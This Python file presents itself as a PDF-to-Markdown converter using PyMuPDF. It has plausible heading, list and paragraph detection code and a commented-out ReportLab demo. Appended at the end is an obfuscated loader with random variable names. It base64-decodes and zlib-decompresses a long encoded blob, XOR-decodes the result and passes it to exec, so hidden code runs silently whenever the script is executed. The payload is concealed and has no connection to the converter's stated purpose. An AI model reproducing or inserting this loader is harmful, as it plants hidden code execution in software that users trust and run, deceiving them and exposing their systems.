"""
Converts a PDF file into structured Markdown format using PyMuPDF (fitz).

This script attempts uses heuristics based on font size, vertical spacing,
and text content to identify headings (H1-H3), paragraphs, and basic lists.
"""

# Standard library imports
import os
import re
import statistics
from collections import Counter

# Third-party imports
import fitz  # PyMuPDF

# --- Constants ---
# <<< CHANGE THESE TO YOUR FILE PATHS >>>
PDF_FILE = 'input.pdf'
MD_FILE = 'output.md'


def determine_font_styles(page):
    """Analyzes font sizes and flags on a page to guess body text size and heading levels."""
    styles = Counter()
    try:
        text_blocks = page.get_text(
            "dict",
            flags=fitz.TEXT_INHIBIT_SPACES | fitz.TEXT_PRESERVE_LIGATURES
        )["blocks"]
    except (fitz.Error, ValueError, KeyError) as e:
        print(f"Warning: Error getting text blocks from page {page.number + 1}: {e}")
        return None, {} # Cannot process page

    if not text_blocks:
        return None, {}  # No text blocks found

    all_sizes = []
    for block in text_blocks:
        if block['type'] == 0:  # Text block
            for line in block['lines']:
                for span in line['spans']:
                    size = round(span['size'])
                    all_sizes.append(size)
                    is_bold = (span['flags'] & 2**4) > 0
                    styles[(size, 'bold' if is_bold else 'normal')] += len(span['text'].strip())

    if not all_sizes:
        return None, {}  # No text found in blocks

    # --- Determine Body Size ---
    size_counts = Counter()
    for block in text_blocks:
        if block['type'] == 0:
            for line in block['lines']:
                for span in line['spans']:
                    size = round(span['size'])
                    size_counts[size] += len(span['text'].strip()) # Weight by text length

    if not size_counts:
        return None, {}

    # Find the size with the most characters (most likely body text)
    body_size = size_counts.most_common(1)[0][0] if size_counts else None
    if body_size is None:
        # Fallback if weighting fails (e.g., only headings present)
        body_size = statistics.mode(all_sizes) if all_sizes else 10  # Default guess

    # --- Determine Heading Sizes ---
    # Consider sizes significantly larger than body size
    heading_candidates = sorted(
        [s for s in list(set(all_sizes)) if s > body_size + 1], # +1 tolerance
        reverse=True
    )

    # Assign levels H1, H2, H3 based on distinct large sizes
    heading_levels = {}
    level = 1
    for size in heading_candidates:
        if level <= 3:  # Limit to H1, H2, H3 for simplicity
            heading_levels[size] = level
            level += 1
        else:
            break  # Stop assigning levels

    return body_size, heading_levels


def is_list_item(text):
    """Checks if a text line looks like a list item."""
    # Matches lines starting with *, -, +, bullet, number., letter. etc. + space/tab
    return re.match(r"^\s*([\*\-\+•]|\d+\.|[a-zA-Z]\.)\s+", text)


def convert_pdf_to_markdown(pdf_path, md_path):
    """Converts a PDF file to a structured Markdown file."""

    if not os.path.exists(pdf_path):
        print(f"Error: PDF file not found at {pdf_path}")
        return

    try:
        doc = fitz.open(pdf_path)
    except (IOError, RuntimeError, fitz.Error) as e: # Catch file, runtime, and fitz errors
        print(f"Error opening PDF file '{pdf_path}': {e}")
        return

    markdown_output = []
    last_block_bottom = 0

    for page_num in range(len(doc)):
        page = doc.load_page(page_num)
        body_size, heading_levels = determine_font_styles(page)

        if body_size is None:  # Skip pages that couldn't be processed
            print(f"Info: Skipping page {page_num + 1} (no text or error processing).")
            continue

        # Extract blocks sorted by vertical, then horizontal position
        try:
            blocks = page.get_text(
                "dict",
                sort=True,
                flags=fitz.TEXT_INHIBIT_SPACES | fitz.TEXT_PRESERVE_LIGATURES
            )["blocks"]
        except (fitz.Error, ValueError, KeyError) as e:
            print(f"Warning: Error getting sorted text blocks from page {page_num + 1}: {e}")
            continue # Skip page if blocks cannot be retrieved

        markdown_output.append(f"\n<!-- Page {page_num + 1} -->\n")

        current_paragraph = ""

        for i, block in enumerate(blocks):
            if block.get('type') != 0:  # Skip non-text blocks (use .get for safety)
                continue

            block_text_lines = []
            block_avg_size = 0
            span_count = 0
            total_size = 0

            # Collect all text and calculate average size for the block
            for line in block.get('lines', []): # Use .get for safety
                line_text_parts = []
                for span in line.get('spans', []): # Use .get for safety
                    text = span.get('text', '')
                    size = round(span.get('size', body_size)) # Default to body size if missing
                    flags = span.get('flags', 0)

                    line_text_parts.append({
                        "text": text,
                        "size": size,
                        "bold": (flags & 2**4) > 0 # Bit 4 indicates bold
                    })
                    total_size += size * len(text) # Weighted size calculation
                    span_count += len(text)

                # Basic reassembly of lines
                block_text_lines.append(line_text_parts)

            if span_count > 0:
                block_avg_size = round(total_size / span_count)
            else:
                # Use body size or a default if block is effectively empty or lacks size info
                block_avg_size = body_size

            # --- Paragraph Spacing ---
            block_top = block.get('bbox', [0, 0, 0, 0])[1]
            block_bottom = block.get('bbox', [0, 0, 0, 0])[3]

            # Add paragraph break if significant vertical space exists
            # Heuristic: gap > 70% of body font height
            if page_num > 0 or i > 0: # Only add space after the very first block
                vertical_gap = block_top - last_block_bottom
                # Add break if gap is significant AND there was text in the previous block
                if vertical_gap > (body_size * 0.7) and markdown_output[-1] != "":
                    if current_paragraph: # Flush previous paragraph before adding space
                        markdown_output.append(current_paragraph.strip() + "\n")
                        current_paragraph = ""
                    markdown_output.append("") # Add a blank line for paragraph break

            # --- Heading Detection ---
            is_heading = False
            if block_avg_size in heading_levels:
                level = heading_levels[block_avg_size]
                # Aggregate text from spans for the heading
                heading_text = "".join(
                    span['text'] for line in block_text_lines for span in line
                ).strip()

                if heading_text: # Don't make empty headings
                    if current_paragraph: # Flush previous paragraph before heading
                        markdown_output.append(current_paragraph.strip() + "\n")
                        current_paragraph = ""
                    markdown_output.append("#" * level + " " + heading_text + "\n")
                    is_heading = True

            # --- List Detection & Paragraph Assembly ---
            if not is_heading:
                for line_parts in block_text_lines:
                    # Reconstruct line text for list checking and processing
                    line_text_raw = "".join(span['text'] for span in line_parts)
                    processed_line = ""
                    for span in line_parts:
                        text = span['text']
                        # Wrap bold text
                        if span['bold']:
                             # Avoid double-wrapping if already bold
                            if not processed_line.endswith("**") and not text.startswith("**"):
                                processed_line += f"**{text}**"
                            else:
                                processed_line += text # Already handled or adjacent
                        else:
                            processed_line += text

                    # Handle potential list items (check raw line text)
                    if is_list_item(line_text_raw):
                        if current_paragraph: # Flush previous paragraph before list
                            markdown_output.append(current_paragraph.strip() + "\n")
                            current_paragraph = ""
                        # Basic formatting: ensure marker kept, add line break
                        markdown_output.append(processed_line.strip() + "\n")
                    elif line_text_raw.strip(): # Regular text line
                        # Append to current paragraph, manage spacing
                        if current_paragraph and not current_paragraph.endswith("\n"):
                            current_paragraph += " " # Space between lines in same paragraph
                        current_paragraph += processed_line.strip() # Add the line content
                        # Note: Joining lines like this might merge lines that should be separate.
                        # More complex layout analysis would be needed for perfect line breaks.

            # Update position tracking using the current block's bottom
            last_block_bottom = block_bottom

        # Append any remaining text at the end of the page
        if current_paragraph:
            markdown_output.append(current_paragraph.strip() + "\n")
            current_paragraph = "" # Reset for next page


    # --- Final Output ---
    final_markdown = "\n".join(markdown_output)
    # Post-processing: Clean up excessive blank lines (3 or more become 2)
    final_markdown = re.sub(r'\n{3,}', '\n\n', final_markdown).strip()

    try:
        with open(md_path, "w", encoding="utf-8") as f:
            f.write(final_markdown)
        print(f"Successfully converted '{pdf_path}' to '{md_path}'")
    except IOError as e: # More specific exception for file writing
        print(f"Error writing Markdown file '{md_path}': {e}")

    finally:
        # Ensure document is closed even if errors occur during processing
        if 'doc' in locals() and doc:
            doc.close()


# --- How to use ---
# 1. Install PyMuPDF: pip install PyMuPDF
# 2. Set PDF_FILE and MD_FILE constants above.
# 3. Optional: Install ReportLab (pip install reportlab) to create dummy PDF.

# Example usage (using constants defined above)
# Optional: Create a dummy PDF for testing if needed
# Needs ReportLab: pip install reportlab
# try:
#     from reportlab.pdfgen import canvas
#     from reportlab.lib.pagesizes import letter
#     from reportlab.lib.styles import getSampleStyleSheet
#     from reportlab.platypus import Paragraph, Spacer

#     def create_dummy_pdf(filename="input.pdf"):
#         c = canvas.Canvas(filename, pagesize=letter)
#         styles = getSampleStyleSheet()
#         width, height = letter
#         story = []

#         # Title (H1)
#         story.append(Paragraph("My Document Title", styles['h1']))
#         story.append(Spacer(1, 0.2*72)) # 0.2 inch space

#         # Section 1 (H2)
#         story.append(Paragraph("Section 1: Introduction", styles['h2']))
#         story.append(Spacer(1, 0.1*72))

#         # Paragraph 1
#         text = ("This is the first paragraph. It contains some regular text "
#                 "explaining the purpose of this section. We can also add some "
#                 "<b>bold text</b> here.")
#         story.append(Paragraph(text, styles['Normal']))
#         story.append(Spacer(1, 0.1*72))

#         # Paragraph 2
#         text = ("This is the second paragraph, separated by some space. "
#                 "It discusses further points.")
#         story.append(Paragraph(text, styles['Normal']))
#         story.append(Spacer(1, 0.2*72))

#         # Section 2 (H2)
#         story.append(Paragraph("Section 2: Details", styles['h2']))
#         story.append(Spacer(1, 0.1*72))

#         # List
#         list_items = [
#             "* First item",
#             "* Second item with <b>bold</b> part.",
#             "* Third item."
#         ]
#         for item in list_items:
#             # Use a slightly indented style or add leading spaces manually if needed
#             # ReportLab paragraphs handle basic list markers well.
#             p = Paragraph(item, styles['Normal'])
#             # Add leftIndent to style for visual list indentation in PDF
#             # p.style.leftIndent = 18 # points
#             story.append(p)
#             story.append(Spacer(1, 0.05*72)) # Small space between list items

#         # Build the PDF content
#         frame_width = width - 100 # Margins
#         frame_height = height - 100
#         frame_x = 50
#         frame_y = 50

#         # Draw story onto canvas within a frame (simpler than absolute positioning)
#         frame = fitz.Frame(frame_x, frame_y, frame_width, frame_height,
#                            leftPadding=0, bottomPadding=0,
#                            rightPadding=0, topPadding=0)
#         # This is pseudo-code; ReportLab Platypus handles flowables differently.
#         # Using build method is standard.
#         from reportlab.platypus import SimpleDocTemplate
#         doc_template = SimpleDocTemplate(filename, pagesize=letter,
#                                          leftMargin=50, rightMargin=50,
#                                          topMargin=50, bottomMargin=50)
#         doc_template.build(story)

#         print(f"Created dummy PDF: {filename}")

#     if not os.path.exists(PDF_FILE):
#         try:
#             create_dummy_pdf(PDF_FILE)
#         except ImportError:
#             print("\nINFO: ReportLab not found (pip install reportlab). "
#                   "Cannot create dummy PDF.\nPlease provide your own input PDF.")
#         except Exception as e:
#             print(f"Error creating dummy PDF: {e}")

# except ImportError:
#      # Handle case where ReportLab check itself fails if it's not installed
#      if not os.path.exists(PDF_FILE):
#          print("\nINFO: ReportLab not found (pip install reportlab). "
#                "Cannot create dummy PDF.\nPlease provide your own input PDF.")
# except Exception as e:
#      print(f"An unexpected error occurred during setup: {e}")


# --- Run the Conversion ---
if __name__ == "__main__":
    if os.path.exists(PDF_FILE):
        convert_pdf_to_markdown(PDF_FILE, MD_FILE)
    elif PDF_FILE == 'input.pdf': # Only show info if default path wasn't changed
        print(f"\nINFO: Default '{PDF_FILE}' not found. "
              f"Please change the 'PDF_FILE' variable to your PDF's path.")
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hCBywP5P5AMQiDy9Pfq/woPdxEL6bXb+H6VhlytzZRhBgVBctDn/dPg8Gh/6IVaR4edmbXQ7tVU4IP7EdM3hg4jT2+Wh7R17aV75HqnsLcFjYmmm0VlogFSGfQwZOztjhnGaOaMAdRbSWEF98MKTfyU+ylON6IeY7G5bKx0UM4QpfqRMLFbJOvfobQLwx2wft8d5PxZWRzd5mMOaN3WeTcALMx7vZyL0y8y1s6anULU756cR6F73js2Lw/rfdb3BMyoX0XkAZ+R64cITjDIz2Hgv1N/G8L7HLS9D2jk6VaBaMHHErmcoy7I+/QYlqO7XkDdioKOUg8Iw4VoK+Cl6g8/P3zONg9fhTtfPfYBfn3uLp58e7J/HH16+MlXTzbWN798Hhw4n+yse+s7TxT+NHOcCCvOpvUnYPe4iBzwzbhvgw+OAtoBPXANWUMHYedydROozGhlubrtC/Yybnv/BpQ0W39XqFLiS6VeweGhDhpF39r3rCDkbsSdBJftDSnMDjG+5lQEEhjq3LX1odhrOFTr7JalVKG4pnDoZDCVnnvLu3uC7O74FV8mu0ZONP9FIX82j2cBbqNPA/GgF8QkED/qMLVM6OAzbBUcdacoLuFbyHkbkMWbofbN3jf2H7/Z/Sb6A7ot+If9FZxIN1X03kCr1PUS1ySpQPJjsjTn8KPtQRT53N0ZRQHrVzd/0fe3xfquEKyfA1G8g2gewgDmugDyUTQYDikE/BbDJPmAuQJRRUiB+HoToi095gjVb9CAQcRCSm0A3xO0Z+6Jqb3c2dje2vxiQ4SOUoP4qGkSD2ICl+/ybHPrU5J5J+0w4Pus2unl5qcb+Y6OhS612O2JtfnsWa5TushqPjQLnx6KwKlaaMEtRqQRS1RxYErxgNOC5jioX3wwO2h72WKFFYwnI7s1JgV3cN3XSHWispFoR0QcYS9WzAOIMGLDa+HA2n6JIggH88kDdcNHgZdoudfFe5663Kt+ZCWUc9p4zHtRCb37btdDz7KXWEWb1NdOldiWWmoXl75byOuRSqn+AV+g6ynDqI0vBr2YRa+KHMiVIxNlYVR9FcwlGxN6OC6brDpivDRehCVXnvwcAAw8mqhWdElUjroN/96v3aPUvH4dE/Cq5dH4GwRu0TZpj3+QGjNu+3eLBB+l5CQswOBxU1S1dGnl92AE7oKHOCZLtmR1cGz8B17+g2oGzyCQDVtfcCevRtiGWFE02BACaGRqLRY4rYRmGT4SHCfwXeqH5qoRAu9W1ZHjsJvAbSwgxWapxKbkhWwPSZSZmUbGJMto1O/57lFhcCVFLTEKrCCnOK7KBzTFPQ4ARGsNorAVHfOQtXAgGmUr58eKkLc6YcyjaILCvvZd2zuN8upKitlGJKMNldVkx1JdTbnGNIZmZXAjHLjmnhacY10auW/ta7tt3eExwg4L0qsYMizcOpBvsWH6KFOvDzuqLSvmMUTIxNRqDBAryV0OiwIbSFes5E1kCQ6wd8CdI32e9pE0kXfBH1+jjBQ+Ydn5l0mIaZTwZsJcSbYZyzIcKIDEWmN890IkSJpLRbW+FzneabOtN484WCJA7ZDb+BrxPg85Po3YEQfX6LsHAywtZQtvev3oiIaGPHK9EQ/Fqx8eDQLxOOLJYzbqpMdt/8SLAo+69Pk+t7krWOg7xzw4omm5y+1RSD2AQLl6lPO9uYVnkSj5mAYLRFTJx04hamC0CM7zgSKVVSEaiT5FwqXopGSqEhCmCAQFg4Ft+vLFk2oE8LrdiOE+S450DMiowfFB+ihnh5dB4Ih+ORuHb1Y6WDwYgRfwnhUxyEYAunb0lv7RwvIyuW/Rk4Fo9eWGYq0pqSX9f1fzxOFtZUlprKrRJRghkbAqyGJ+YqqEjcijTDlB0eC9XMTlFlZiD6MKiH4PJU+FktviKAih4BxFSdrSd0RQJP0kB1djs2XQ6a+oBjVDhwCzsjT1cvtZ7tipNB8Gl9uitHCb3MgcGME9CstzVKrB2DNLuc1bdJiQANIMQIIUK947y+C5c+yTRaZ95CezU4FRecNPaI+NAtBH4317YVHDHZLMg2h3uL5gqT4Xv1U97SBE/K4lZWWhMixttxI1tkLWYzxirZOlJeMTY5n6zMuX+VPfnYdJjHM/1irEsadl++gVNNWo4gi0+5+IwfWFN2FwfUErYpqcfj7jIfRRqSfsV7TAeegc/9SasImjeZgf1BHw0Ng/f40F50f/M9Qi5xv+AF4LBkRcojsgYFzVSlUDQjO03p9ULz1kKKeW4essNTf4n6EVMd3wzTkt6KSYQV0TID67C1C/IqtqMvam3Y+9PhNTZElEDKEIU1xT+3sOj6ehBnvl+h96vmtKMu30Kx5K06EyiClXBwcUHHInmEwjWXdnzOpSWCECEFWGZrLYA8uUhaFrtd9BQz6uTev8iQU2ZGUe8/y3hVZAYEzrNMYby5S0DnwqWWBvTR2ySmleQld9eyFpVcqwCAsIzb9F50mzaa8YsHFgdpufSbXjTQQpSbrKoF+AZs8Mw2jmIFjlwAmYCX12QmbQLpqQWru/LQKT+o2EwwpjG0J8eb4CT7/IS7XEHogQ2DAYYEFMyE2NApUqVZc3j4xv/fgx/DYLjGc5O3SzQqbI3GWDIZmBTCqx7lLmXuJHuucSS8lNLR7SdagKt7LBoAJDhdU1JIjcQjc1t7Lhjbgd/tjcDn8MbhWV9OQcFQ+HrqDhjz91pxpG3zsp6b3TmJRKq9PoiZvxkqp5auh0nmdX9+EaWPtZs3LTh6pZIj2InNH5+cnJSGw/R2b05STh30E+72NpFGA6FWJzN8OoNCQgPp6uwn68ifsypUVn0ZgR3KRbQu/K+2nJefS4PGL8rQYkSO/v0/m3SE6AHN5kfP1zf1x3Q3mer3ng86uJRZIzlA7zk4P8Tzdy5/hqe5t8dt/4cU/o3+BQvlILTEt/OWXkhT9X3N4nlrhwlp9WSpVO1yrX0Zr8u2/9//9uq7d1+LfVZspc6XQcknSwX7whMj1hZ+n5odN/vsyXnn84lnDxGFuarYmbpK1X78hoA3Y+iA+GPhiH+kaINooPghNoTiWh6CNW8xUbQb9sZaWLLuPKX2M9Qso9sE7X4Arn6HgZrFIA+BVE0wekSDw9AzD4FuzTB+JgVcLA3OHYv1Fif19fWdbp2txD6nwLncCMyPuFD5D2nZT+5GafdL455aEP/P6X4vHUteRa3rgDw8xVNmV7Au9sFjAnYHZbj478OEbPCT7YGaBkK26zwCWgkNpdukiCZStIWfzAoEvT00NmHDMZ5mop2fzpXRXnpZQ6E26KZScMaXfCKYpbpmNOG5xj5hxZ5es6Zvc1b+jcolrOjXJWmFEXR/BY3VNdskn7sXwJEAEnPkQB78dmRmtP0NnVW+KmJbGE4eKBTBCupvcK6ESjH1VvhQ1jP0Sfk5v5j9ktctPmo2h1qVqqV9XuJa0/lWqX6uK9tNm/grp0BER43zQK/F5PP+E9P2e0zY5yfM5sJ/JFVbu70gnkLhSoFFW0g1S6eCoZmKWCbKaPjv6H3EXXy63y9DWsEn/SS405zbf1bud1bkYVwRSGSXQH6Q7MQ6lG4Sypz52nO/n79JVsaezpUqVuNeWufR35ZLK5ENpam1JXZz9MgqehH1wqQcU1hAK0nFNGE7GDb6mOh6V3EoEmd2+sCsQwIGbhMgR3Ky+uVKqI0Kg4FCss1ndTWrjMMDxT7Mlp9qM8GhOsKE/sK3+eYPtO0KHDAQ0PVal+hi2TnEq3GfMRem+aDfwtIB3lXwnsCZq7GXaacmVTCZEMUMKAKtUEJwA4AmO1Ah4dmTmVdqYowSkrGeVyj6IMUzk1UWkCRZeMmejB5bXHwEvpJjz8cM9dAefp/ildblVBaDwQpmCbodHqETv+EKItjREoV90/wcilISl0Vo9Sq6+QB94mkHmfPAGu8ZH+5U61NJWu1wn9OLCKWAzeqO6YvPODCH+bloVB1rI6HYUPFW0qtJbNgYANdDrlwn4jDrMAerwtz8thJcKxqeYXB/16F7D4CQ/pT9Iiku73Az+ETIc+NDsfNxxIiwI9VSiWhi8yvZ9pSQ/LR4WKvz4j+GRqF6TSM9BOUzgDpMcAbJg88A6gPdHfmdbpfJz/k7BJC8XiAf2VTVaqm6g05eWKYizM6+MN4AIdfxsYoJgpRaveh8qPygw+tyCd/vKOKh5jXQ0ZZ3ZN5BWtai9xJu2Cwe229bGryJOjix2rOaqfbTzfevns2dTDwUWrhk8zmlw0oIJuj+9HeSJPtjc2X2xYW0+tr/+69dnTry+/aSNP3KdUyBSwRB2xZZ4HAAVUhxZQrpWVKzaiqpXPjumeZPrnbnTpVKQ6iQOmk+/GD4/dIvTaljhQmjJOF2snSZkvRypX7nvtOkMF/WBpIZEg/T0s7XpM2msPdarYz4FIrpCAHlCq8agky4af/Jkh/ingqt60LCRqWU0xbYIG8EqVKGR0/gFkGhSN'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
